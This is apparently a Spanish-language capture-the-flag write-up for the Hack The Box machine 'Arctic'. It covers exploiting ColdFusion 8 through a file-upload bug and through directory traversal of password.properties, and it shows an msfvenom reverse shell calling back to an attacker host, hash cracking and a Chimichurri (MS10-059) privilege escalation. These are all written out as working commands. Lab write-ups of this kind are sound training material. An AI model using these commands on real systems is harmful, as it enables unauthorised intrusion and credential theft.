## HTB-Arctic
- Maquina: Windows
- Level: Easy
- IP: 10.10.10.11

## Herramientas a utilizar:

- `nmap`
- `BurpSuite` 
    -  https://sniferl4bs.com/2014/01/burp-suite-i-primeros-pasos/
- `searchsploit`
- `curl`
- `rlwrap nc`
- https://crackstation.net/
- https://github.com/egre55/windows-kernel-exploits

##### NMAP

```
nmap -sC -sV -o scan_arctic.txt 10.10.10.11
```

>Aqui veremos que tenemos lo siguiente puertos abiertos.

|PORT|STATE|SERVICE|VERSION|
|-------|-------|-------|-------|
|135/tcp| open| msrpc| Microsoft Windows RPC
|8500/tcp| open| fmtp?|
|49154/tcp| open| msrpc| Microsoft Windows RPC

Iniciaremos nuestra enumeracion por el puerto 8500
```
http://10.10.10.11:8500
```
Buscando rapidamente encontraremos dos directorios
`CFIDE`
`cfdocs`

En `CFIDE` tenemos un site llamado adminisitrator el cual es un panel de inicio.
```
http://10.10.10.11:8500/CFIDE/administrator
```

>Vemos que el usuario ya esta marcado como admin, donde solo debemos probar el password.
intentamos con arctic y no tenemos ningun resultado. he aqui donde utilizaremos BurpSuite.

Abrimos `burdsuit` y nos vamos a la opcion `proxy > options`
aqui cambiamos `Proxy Listerners` de `127.0.0.1:8080` a `10.10.14.x<la ip de la vpn_htb>:8080`

Luego marcamos: 
`Intercept Client Requests > Intercept request`
`Intercept Server Response > Intercept responses`

>Listo, ahora nos toca ir firexfox y en los `add-on` instalamos `FoxProxy` <si no lo tenemos>
```
Clic FoxProxy
Add Proxy
Title : arctic
Proxy Type: http
Proxy IP: 10.10.14.x<la ip de la vpn_htb>
Port: 8080
Clic en save.
```

Volvemos a intentar acceder a arctic con la clave artic
```
http://10.10.10.11:8500/CFIDE/administrator
```
Ahora solo debemos ir a `burdsuit` y en `Proxy > http history` veremos lo siguiente

>cfadminPassword=F6F89337ECDE4A8A92EC34657B38485938F3BA79&requestedURL=%2FCFIDE%2Fadministrator%2Findex.cfm%3F&salt=1613170214614&submit=Login

###### Que es lo que esta pasando aqui:

>Mirando la fuente de la p??gina, puedo ver d??nde el elemento de formulario HTML define qu?? datos se env??an 
cuando solicito el formulario de inicio de sesi??n, el servidor genera un salt y lo env??a en la p??gina. 
Luego, cuando env??o, toma esa sal y usa Javascript para el hash SHA1 y luego HMAC SHA1 hash el resultado, y lo env??a. 

Buscaremos algun exploit existente para coldfunsion
```
searchsploit coldfusion
```
De todo el listado que aparece utilizaremos:
 - ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)

Traeremos el exploit `16788.rb`
```
searchsploit -m cfm/webapps/16788.rb
```

>Este es un exploit relativamente simple: 
Realiza dos solicitudes HTTP. 
Primero es una `POST` a `FCKEDITOR_DIR`, que tiene un valor predeterminado de `/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm definido anteriormente en el script` 
Luego hace un `GET` a `/userfiles/file/` para activar la carga ??til. 

Crearemos nuestra reverse shell.
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.17 LPORT=443 -f raw > rs.jsp
```
Subieromos nuestra reverse shell utilizando el exploit:
```
curl -X POST -F "newfile=@rs.jsp;type=application/x-java-archive;filename=rs.txt" 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/r0ok1e.jsp%00'
```

Verificamos que el archivo r0ok1e.jsp se encuentre en
```
http://10.10.10.11:8500/
```
Veremos que exite un nuevo directorio llamado ``{userfiles/file/}`` y dentro de este tendremos nuestro reverse shell `r0ok1e.jsp`.

El siguiente paso es ponernos en escucha por el puerto 443
```
rlwrap nc -lvnp 443
```

Luego hacer el llamado:
```
curl 'http://10.10.10.11:8500/userfiles/file/r0ok1e.jsp'
```

Listo ya deberiamos tener nuestra shell.
>*C:\ColdFusion8\runtime\bin>* **whoami**
`arctic\tolis`

Vamos por nuestra primera flag en:
```
cd C:\Users\tolis\Desktop
type user.txt
```

### Otro metodo para conseguir acceso es:

>Al examinar la secuencia de comandos de Python del exploit. este emitiendo un `GET` a `http://server/CFIDE/administrator/enter.cfm` con un par??metro de configuraci??n regional que vuelve a subir varios directorios a alg??n archivo y luego termina con `% 00en`. 
Es probable que el sitio se asegure de que la configuraci??n regional termine con una cadena razonable, y el exploit use el byte nulo para pasar esa verificaci??n y as?? obtener el archivo. por esta razon ejecutaremos lo siguiente para extraer el hash del usuario.
```
http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en: 
```

Veremos el siguiente hash
**2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03**

El cual iremos a la web: `https://crackstation.net/` para crackeralo
|HASH|TYPE|RESULT|
|----|----|----|
|2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03| sha1 | happyday |


Listo ahora tenemos el password del admin para iniciar session via web.
```
10.10.10.11:8500/CFIDE/administrator/
```

Antes debemos levantar un WebServer para subir nuestro Shell.
```
python3 -m http.server 80
```

Ahora iniciamos session:
```
http://10.10.10.11:8500/CFIDE/administrator
user:admin
pass:happyday
```

Una vez iniciada la session iremos a `Debugging & Logging > Scheduled Tasks`
Creamos un nuevo Task donde solo completaremos lo siguiente:
```
TASK NAME: r0ok1e
URL: http://10.10.14.17/rs.jsp
PUBLISH: marcamos save output to file
FILE: C:\ColdFusion8\wwwroot\CFIDE\r0ok1e.jsp
SUMMIT
```
>Listo ya tenemos nuestra tarea creada, hacemos clic en ejecutar y veremos como carga nuestro `rs.jsp`.

Ahora para verificar debemos ir a:
```
http://10.10.10.11:8500/CFIDE/
```
Aqui veremos nuestra reverse shell rs.jsp nos ponemos en eschuca por el puerto 443
```
rlwrap nc -nlvp 443
```

>Volvemos al navegador y hacemos clic en `r0ok1e.jsp` y listo tenemos nuestra reserse shell con la cual volvemos a tener acceso a la arctic para optener la primera flag.

#### Continuamos con la enumeracion para conseguir root.

Ejecutamos desde `c:\systeminfo`

>Vemos que *no tiene ningun parche aplicado*, por lo que buscaremos alguna vulnerabilidad que pueda tener.
Encontramos que es vulnerable a `MS10-059` tambien un exploit para dicha vulnerabilidad

**Descargaremos el exploit**
```
git clone https://github.com/egre55/windows-kernel-exploits
```
```
cd windows-kernel-exploit
mv 'MS10-059: Chimichurri/Compiled/Chimichurri.exe' ../
```

Vamos a subir el archivo `chimichurri.exe` a `arctic`
```
impacket-smbserver share ./
```

Volvemos a arctic y desde la siguiente ruta ejecutaremos lo siguiente:
```
cd C:\ProgramData
net use \\10.10.14.17\share
copy \\10.10.14.47\share\Chimichurri.exe .
```

Volvemos a ponerno en escucha por el puerto 443
```
rlwrap nc -nlvp 443
```

Ahora ejecutamos el chimichurri.exe
```
.\Chimichurri.exe 10.10.14.17 443
```

y en unos 30 seg. debemos tener shell con el cual solo habra que hacer:
```
type C:\Users\Administrator\Desktop\root.txt
```
